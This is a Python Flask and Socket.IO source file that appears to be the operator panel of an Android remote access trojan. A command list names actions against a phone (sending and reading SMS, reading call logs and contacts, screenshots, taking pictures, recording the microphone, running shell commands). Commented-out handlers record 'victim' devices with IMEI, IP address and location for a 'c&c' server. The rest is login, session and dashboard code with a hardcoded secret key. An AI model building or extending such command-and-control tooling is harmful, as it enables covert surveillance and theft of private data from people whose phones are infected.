import re
from sqlite3.dbapi2 import Error
from flask import Flask, json, jsonify, render_template, url_for, request, redirect, session, make_response
from flask_socketio import SocketIO, emit
from passlib.hash import pbkdf2_sha256
import sqlite3
import uuid
import datetime

# below dashboard pass data from nav link ro confirm original request
app = Flask(__name__)
app.secret_key = 'the rastafarian in you'
socketio = SocketIO(app)

''' COMMAND LIST
0x0 - Send SMS
0x1 - Read SMS
0x2 - Read Call Log
0x3 - Read Contacts
0x4 - Write Contact
0x5 - Screenshot
0x6 - Get Camera List
0x7 - Take Picture
0x8 - Record Mic
0x9 - sh Command
0xA - List Installed Apps
'''

commands = [
    "0x0",
    "0x1",
    "0x2",
    "0x3",
    "0x4",
    "0x5",
    "0x6",
    "0x7",
    "0x8",
    "0x9",
    "0xA"
]

@socketio.on('connect')
def test_connect():
    with open('server_soc_id.txt', 'w') as f:
        f.write(request.sid)
    emit('after connect',  {'data':'Session starting ...'})


@socketio.on('Slider value changed')
def value_changed(message):
    print(message['data'])
    emit('update value', message, broadcast=True,)

# @socketio.on("fetch_victim")
# def fetch_victim_details(id):
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
#         record = cur.fetchall()
#         con.close()
#         emit("add_victim", record)
#     except sqlite3.Error as error:
#         # do something


# @socketio.on
# def connect():
#   # get socket id an write to txt
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
#         record = cur.fetchall()
#         con.close()
#         # emit to c&c id
#         if record.__len__() != 0:
#             emit("victims", record)
#         else:
#             emit("victims", None)
#     except sqlite3.Error as error:
#         # do something

# @socketio.on("victim_connect")
# def victim_connect(details):
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute(
#             "INSERT INTO victim(device-id, client-id, ip-address, imei, os, network, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
#             (
#                 details['device-id'],
#                 details['client-id'],
#                 details['ip-address'],
#                 details['imei'],
#                 details['os'],
#                 details['network'],
#                 details['location'],
#             )
#         )
#         con.commit()
#         con.close()
#         # emit to c&c
#         emit("new_device", "device id")
#     except sqlite3.Error as error:
#         # do something

# @socketio.on("pong")
# def reply(msg):
#     print(msg)

# def get_ccid():
#     ccid = ""
#     with open("ccid.txt", "r") as id:
#         ccid = id.read()
#     return ccid





@app.route("/", methods=['GET'])
def index():
    if 'username' not in session:
        return redirect("/login", code=302)
    else:
        return render_template("index.html"), 200


@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        if 'username' in session:
            return redirect("/", code=302)
        elif 'auth' in request.cookies and 'username' in request.cookies:
            username = request.cookies.get('username')
            token = request.cookies.get('auth')
            try:
                con = sqlite3.connect("database.db")
                cur = con.cursor()
                cur.execute("SELECT token FROM user WHERE username= ?", (username,))
                record = cur.fetchall()
                con.close()
                if record.__len__() != 0 and record[0][0] == token:
                    session['username'] = username
                    return redirect("/", code=302)
                else:
                    return render_template("login.html"), 200
            except sqlite3.Error as error:
                pass
        else:
            return render_template("login.html"), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None:
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (username,))
            record = cur.fetchall()
            con.close()
            if record.__len__() != 0 and username == record[0][0]:
                if pbkdf2_sha256.verify(password, record[0][1]):
                    session['username'] = username
                    if request.form.get('remember') is not None:
                        token = str(uuid.uuid4())
                        try:
                            con = sqlite3.connect("database.db")
                            cur = con.cursor()
                            cur.execute("UPDATE user SET token= ? WHERE username=?", (token, username))
                            con.commit()
                            con.close()
                        except sqlite3.Error as error:
                            pass
                        expiry_date = datetime.datetime.now()
                        expiry_date = expiry_date + datetime.timedelta(days=30)
                        resp = make_response(redirect("/", code=302))
                        resp.set_cookie(key='auth', value=token, expires=expiry_date, domain='127.0.0.1')
                        resp.set_cookie(key='username', value=username, expires=expiry_date, domain='127.0.0.1')
                        return resp
                    return redirect("/", code=302)
                else:
                    return render_template("login.html", error="Login Failed. Incorrect username/password"), 401
            else:
                return render_template("login.html", error="Login Failed. Incorrect username/password"), 401
        except sqlite3.Error as error:
            return render_template("login.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/logout", methods=['GET'])
def logout():
    if request.method == 'GET':
        if 'username' in session:
            session.pop('username', None)
            if 'auth' in request.cookies and 'username' in request.cookies:
                resp = make_response(redirect("/login", code=302))
                resp.set_cookie(key='auth', expires=0)
                resp.set_cookie(key='username', expires=0)
                return resp
            return redirect("/login", code=302)
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/dashboard", methods=['GET'])
def dashboard():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("dashboard.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/log", methods=['POST'])
def log():
    if request.method == 'POST':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("log.html", log= [str(datetime.datetime.now().strftime('%d/%b/%Y %I:%M:%S %p')), request.form['highlight'], request.form['data']])}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", log= ["400", "Bad Request"]), 400

@app.route("/files", methods=['GET'])
def files():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("files.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/settings", methods=['GET'])
def settings():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("settings.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/reset", methods=['GET', 'POST'])
def reset_password():
    if request.method == 'GET' and 'username' in session:
        return render_template("reset-password.html", username=session['username']), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None and 'username' in session:
        username = request.form.get('username')
        password = pbkdf2_sha256.hash(request.form.get('password'))
        token = str(uuid.uuid4())
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (session['username'],))
            record = cur.fetchall()
            if record.__len__() != 0:
                cur.execute("UPDATE user SET username= ?, passkey= ?, token= ? WHERE username=?", (username, password, token, session['username']))
                con.commit()
                con.close()
                session['username'] = username
                if 'auth' in request.cookies and 'username' in request.cookies:
                    resp = make_response(redirect("/", 302))
                    expiry_date = datetime.datetime.now()
                    expiry_date = expiry_date + datetime.timedelta(days=30)
                    resp = make_response(redirect("/", code=302))
                    resp.set_cookie(key='auth', value=token, expires=expiry_date, domain='127.0.0.1')
                    resp.set_cookie(key='username', value=username, expires=expiry_date, domain='127.0.0.1')
                    return resp
                return redirect("/", 302)
            else:
                con.close()
                return render_template("reset-password.html", error="Oops something went wrong"), 401
        except sqlite3.Error as error:
            con.close()
            return render_template("reset-password.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400

@app.errorhandler(404)
def page_not_found(e):
    return render_template('error_page.html', code= ["404", "Not Found"]), 404



if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5001, debug=True, keyfile='key.pem', certfile='cert.pem')